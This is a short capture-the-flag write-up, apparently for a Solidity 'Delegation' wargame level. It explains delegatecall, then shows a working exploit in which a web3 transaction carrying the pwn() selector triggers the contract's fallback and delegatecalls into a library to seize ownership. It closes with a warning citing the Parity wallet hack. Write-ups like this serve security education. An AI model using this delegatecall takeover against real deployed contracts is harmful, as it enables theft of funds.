# Delegation

## Key

> Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.

> There exists a special variant of a message call, named delegatecall which is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and msg.sender and msg.value do not change their values.
> https://docs.soliditylang.org/en/v0.8.12/introduction-to-smart-contracts.html?highlight=delegatecall#delegatecall-callcode-and-libraries

**`DELEGATECALL` To invoque it:**

```
contract.delegatecall(abi.encodeWithSignature("functionNombre(uint256)", _num));
```

**`FALLBACK` function:**

```
To trigger fallback function, the simplest way is to use sendTransaction
```

## Solution

1. Find `pwn()` function signature:

```js
web3.eth.abi.encodeFunctionSignature('pwn()');
('0xdd365b8b');
```

2. Use is as part of `data` inside a transaction that will trigger the fallback function

```js
web3.eth.sendTransaction({
  from: player,
  to: contract.address,
  data: '0xdd365b8b',
});
```

## Post solution info

Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state". Delegates have complete access to your contract's state. The delegatecall function is a powerful feature, but a dangerous one, and must be used with extreme care.

Please refer to the The Parity Wallet Hack Explained (https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7) article for an accurate explanation of how this idea was used to steal 30M USD.
